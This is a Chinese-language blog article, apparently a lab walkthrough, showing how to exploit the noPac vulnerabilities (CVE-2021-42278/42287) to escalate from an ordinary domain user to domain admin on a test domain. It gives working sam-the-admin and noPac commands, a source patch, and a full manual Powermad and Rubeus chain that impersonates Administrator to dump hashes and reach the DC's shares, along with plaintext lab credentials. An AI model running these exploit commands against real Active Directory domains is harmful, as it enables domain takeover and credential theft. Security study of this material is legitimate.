<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/urKdoW9SgalZ4UtA2_1SBw)

环境介绍 sam-the-admin python 利用脚本 noPac 利用脚本利用流程    1. 查询 MAQ 值    2. 普通域用户创建机器账户并清除 SPN    3. 重设机器名称    4. 为机器账户请求 TGT    5. 再次更改机器账户的 sAMAccountName    6. 通过 S4U2self 协议向 DC 请求 TGS 票据参考链接

环境介绍
----

域：`god.org`

**windows 7**

```
192.168.52.143
机器名称：stu1
域内普通用户：liukaifeng01:hongrisec@2021@

```

**windows server 2008（DC）**

```
192.168.52.138
机器名称：owa
域管用户：administrator:rihongsec@2021

```

sam-the-admin python 利用脚本
-------------------------

https://github.com/WazeHell/sam-the-admin

目前脚本只能在 kali 环境下运行，Windows 下运行错误如下：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bLeic7rITNF3tesDYnLaDn6LuhOr0o0l4z3RP0PZZlK1iaL7QYzN4V21w/640?wx_fmt=png)

```
python3 sam_the_admin.py "god/liukaifeng01:hongrisec@2021@" -dc-ip 192.168.52.138 -shell

```

旧版 kali 无 smbexec 可执行文件：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bSCicAndsDpSa3USmnX7IsSuvwRkB6qJMt8xicrA6bKyXJIC3v7rD8kZg/640?wx_fmt=png)

查看源码实际就是调用两个可执行文件：

```
fbinary = "/usr/bin/impacket-smbexec"
  if options.dump:
      fbinary = "/usr/bin/impacket-secretsdump"
  getashell = f"KRB5CCNAME='{adminticket}' {fbinary} -target-ip {options.dc_ip} -dc-ip {options.dc_ip} -k -no-pass @'{dcfull}'                                                                   "
  os.system(getashell)

```

kali 中存在这两个文件的 py 形式，`/usr/local/bin/smbexec.py` 和 `/usr/local/bin/secretsdump.py`

修改源码为如下：

```
fbinary = "python3 /usr/local/bin/smbexec.py"
  if options.dump:
      fbinary = "python3 /usr/local/bin/secretsdump.py"
  getashell = f"KRB5CCNAME='{adminticket}' {fbinary} -target-ip {options.dc_ip} -dc-ip {options.dc_ip} -k -no-pass @'{dcfull}'                                                                   "
  os.system(getashell)

```

漏洞利用成功：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bQhTOkpUKQ90YGdDnSzrQ7ILwLnjHsQeicNgSmyodbibIxJZY4CfmMJ7A/640?wx_fmt=png)

noPac 利用脚本
----------

**建议先看下面的利用流程章节，再看本章。**

项目地址：https://github.com/cube0x0/noPac

使用 visual studio 进行编译，编译成功后在目标机器运行报错：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bHPicMdqSxCzQyCrl47P2ONOpQUyUvibwUk5S6oOszeSkhia7s1PAGE1Hw/640?wx_fmt=png)

查了下是目标 .NET 版本与编译时 .NET 版本问题，改成 .NET 4.0 进行编译就没有问题了：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bHY4vJ89EiaLZEEBvvCmv1fVh0pqbPlOJhnbPghl3DTzKFrz1k9J5ASg/640?wx_fmt=png)

漏洞验证：

```
noPac.exe scan -domain god.org -user liukaifeng01 -pass "hongrisec@2021@"

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bxrWwKRp5nmbWeZZrUlNicaM1RwDIdIb5iajykGD1AMVrtSbcPibk70Iibg/640?wx_fmt=png)

利用漏洞生成文件服务票据并访问域控文件：

这个漏洞需要新建一个机器账户， -mAccount 为新建机器账户名，-mPassword 为密码

```
noPac.exe -domain god.org -user liukaifeng01 -pass "hongrisec@2021@" /dc owa.god.org /mAccount testpc /mPassword testpassword /service cifs /ptt

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bjGpzbAbvgO2wSMKy6PZV3CwLUNbB7OaCELBM1GKvHUkeD94D7jQWXA/640?wx_fmt=png)

这里只生成了一个文件服务的票据，但是还是无法访问域控文件：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bySWLAicgCScpxJHmrurk7biaicDiaFRcokolSa5yoxkK3iafLU19aOfzyVg/640?wx_fmt=png)

我又继续生成一个 ldap 服务的票据，成功访问文件服务：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bnibuMR2TpC2v3oYDicz67IG80zib1Y6ictfaWjBnpVV2C8scF12QtHj31A/640?wx_fmt=png)

同样可以 dcsync：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bia3OOh0B9LoD4m8SsicYr7Go2icYoWmbxMSiaq67iaJ7o9TiciasTka7NFEYg/640?wx_fmt=png)

利用流程
----

### 1. 查询 MAQ 值

powerhsell 下：

```
import-module activedirectory

Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota

```

如果无法导入 activedirectory 模块，则说明 powerhsell 版本不够。

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bt1qS3HfiaFnr0Fmq505g5qT6J1p7xw6cKSaH0p1FEXia3ibMBLGscvNkQ/640?wx_fmt=png)

MachineAccountQuota 默认为 10，**值为 0 意味着普通用户无法创建机器账户**，也就无法直接利用这个漏洞。

### 2. 普通域用户创建机器账户并清除 SPN

可以使用 impacket 的 `addcomputer.py` 或是 `powermad`。

通过利用 `powermad.ps1` 新增机器帐号（MAQ=10，域用户默认可以新建 10 个机器账户）

下载地址：https://github.com/Kevin-Robertson/Powermad

在普通域机器 powershell 下执行：

```
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Powermad.ps1
# 新建机器账户为 newpc，密码设置为hongrisec@2019
New-MachineAccount -MachineAccount newpc -Domain god.org -DomainController owa.god.org -Verbose
net group "domain computers" /domain

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5b2V4gWMehtt2WiaLF6opUFsRwZibAKUYsNjiahrNEbrrY2vcicdusWSnktA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bwExBm2AXjS9jauqNHHWnBSCva2kFo4lOQyzsMMzNbW4aSSrodaXDUA/640?wx_fmt=png)

服务主体名称 (SPN) 是服务实例的唯一标识符。Kerberos 身份验证使用 SPN 将服务实例与服务登录帐户相关联。这允许客户端应用程序请求服务验证帐户，即使客户端没有帐户名称。

`addcomputer.py`是利用 SAMR 协议创建机器账户，这个方法所创建的机器账户没有 SPN，所以可以不用清除。

通过 PowerView.ps1 清除机器账户的 servicePrincipalName 属性

```
Import-Module .\PowerView.ps1
Set-DomainObject "CN=newpc,CN=Computers,DC=god,DC=org" -Clear 'serviceprincipalname' -Verbose

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5b2JDcmeD00RVc54cHcXNK4S8CYibSiaJM3lhsZWWibxZDxOLSDN0no0Uew/640?wx_fmt=png)

### 3. 重设机器名称

将机器账户的 sAMAccountName，更改为 DC 的机器账户名字，注意后缀不带 $

```
Set-MachineAccountAttribute -MachineAccount newpc -Value "owa" -Attribute samaccountname -Verbose

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bsjbt5E0B11kGSXE2pvLEW9pWJAgbNZfC9VuVcdO6KoCGO3eKrDzwEg/640?wx_fmt=png)

修改成功：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5b5c251ha1zUUvrtslF1sdvlyeTiaL60qyDyTYqoewVdwJTTsITJ2uIwQ/640?wx_fmt=png)

### 4. 为机器账户请求 TGT

使用 Rubeus 请求 tgt

项目地址：https://github.com/GhostPack/Rubeus

我使用 visual studio 2017 进行编译。编译时遇到 c# 版本问题，根据参考链接已解决。

```
Rubeus.exe asktgt /user:owa /password:hongrisec@2019 /domian:god.org /dc:owa.god.org /nowrap

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bFEP8gBejVyia1dsLs0bG6cgvXCyQg7dkrqGDrTZISiaxFkXEvic33SjicA/640?wx_fmt=png)

### 5. 再次更改机器账户的 sAMAccountName

将机器账户的 sAMAccountName 更改为其他名字，改回原来属性，或者其他的，不与步骤 3 重复即可。

```
Set-MachineAccountAttribute -MachineAccount newpc -Value "newpc2" -Attribute samaccountname -Verbose

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5buvXXS13eTPw5KibysFFKia183XP1cwVoL7ibPMnXz3L8Qn6vSJTC6odWg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bbUibwMSjuLaD5Cich6OtdwjbyNddiaNZNXsxRvic2CfWficiaX5Iiac54F2Aw/640?wx_fmt=png)

### 6. 通过 S4U2self 协议向 DC 请求 TGS 票据

```
./Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"ldap/owa.god.org" /dc:"owa.god.org" /ptt /ticket:上面获取到的tgt票据内容

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bXJNtEper4aLcS0cKAHGicN1QlGhAiaZaIcOzPAlspH585lfx0ZsqBzMw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5biasdPJ6icWo1TsYhz91Y9MupvZMsz0NiblvW9tcoutjgplOsT8QjfMWfw/640?wx_fmt=png)

成功获取 TGS 票据：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bJoD0a88FYpQ341NFdNOqD5UkKTOpPv7DETeBsCArKsib8MnQjq9fr5Q/640?wx_fmt=png)

注意这里获取的是 ldap 服务的票据，所以我们可以 dumphash，而不能访问文件服务：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bmxsVppQW37tcvDujOjlLxF42JsYJ9RuTngNC713JIPt1Cgh0wz5ToQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bMLKxYKjCv5Pib1icGEwGyPLo5icWmcul0tQlZCY4akOAu7ynqqTdLkpRg/640?wx_fmt=png)

重新生成一个票据，定义服务为 cifs：

```
/altservice:"cifs/owa.god.org"

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5brXl6KpcZicxl3tBAnYos3WeeSz1gUxzZCu2ic2BibHHEVxLYfwyaXdN6A/640?wx_fmt=png)

成功访问文件服务：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUCibXUaNMricq4SjFjtriaX5bvat0Xez9oRkGkStmSOjSiaszQ07OZGYr3Ka6NP68LsmAX3OP4WsJkYw/640?wx_fmt=png)

参考链接
----

[只需要一个域用户即可拿到 DC 权限（CVE-2021-42287 and CVE-2021-42278）](https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247489740&idx=1&sn=6754a12ea6031b651076d5f3502ecb0a&scene=21#wechat_redirect)

MIMIKATZ 编译教程

错误 CS8107 C# 7.0 中不支持功能 “xxxxxx”。请使用 7.1 或更高的语言版本。

Could not load type 'System.Runtime.CompilerServices.ExtensionAttribute' from assembly 'mscorlib